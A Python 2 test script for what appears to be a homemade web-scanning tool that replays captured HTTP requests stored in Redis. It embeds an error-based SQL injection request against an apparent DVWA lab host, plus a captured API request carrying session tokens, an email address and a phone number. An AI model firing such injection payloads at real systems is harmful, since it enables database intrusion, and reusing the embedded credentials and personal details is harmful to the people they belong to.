#! usr/bin/python 
#coding=utf-8 

import sys
import os

from moudle.proxy import socks5
#socks5.start()

from moudle.scan.repeater import Repeate
from moudle.scan.repeater import Sql
from lib.core.oredis import ORedis
from lib.connection.http import analysis_header
from lib.connection import http
ors = ORedis('192.168.5.131', 6379, 0)
headers = ors.iteritems()
for header in headers:
	print header.values()[0]
	pass
#ors.empty()
data = """POST /users HTTP/1.1
Host: api.singulato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://api.singulato.com/doc.html
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 50
Cookie: qqmail_alias=zhuqingchun@singulato.com; Hm_lvt_abbe4d2f9e02a240991cb8e5c6a5325d=1510730025,1510821102,1511313271,1511834728; singulato_token_product=aecfc9ccab0279eabd7cdf00f369e582; token=e669185f0941859ac81316aa701757a4
Connection: close

{"phone":"15223010203"}"""

#filename = os.path.basename("http://baodi")
#print(filename)
"""print
print
ors.set_header('1', data)
print ors.get('1')['request']
repeate = Repeate(ors.get('1')['request'])
response = repeate.replay()
print response.read()"""
#repeate.test()
sql = Sql()
#sql.test()
#ors.empty()
data = """GET /vulnerabilities/sqli/?id=2%20AND%20(SELECT%204084%20FROM(SELECT%20COUNT(*)%2CCONCAT(0x7178716271%2C(SELECT%20(ELT(4084%3D4084%2C1)))%2C0x7176766a71%2CFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20nrrX&Submit=Submit HTTP/1.1
Host: 192.168.5.139
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=i7of6l1iftja32obue0lljlg80; security=low
Connection: close
Upgrade-Insecure-Requests: 1

"""
"""header = analysis_header(data)
print header['headers']
req = http.Request(header['headers'])
#http://192.168.5.132:8111
print header['url']
response = req.post(header['url'], header['params'])
print response.headers
print response.read()"""
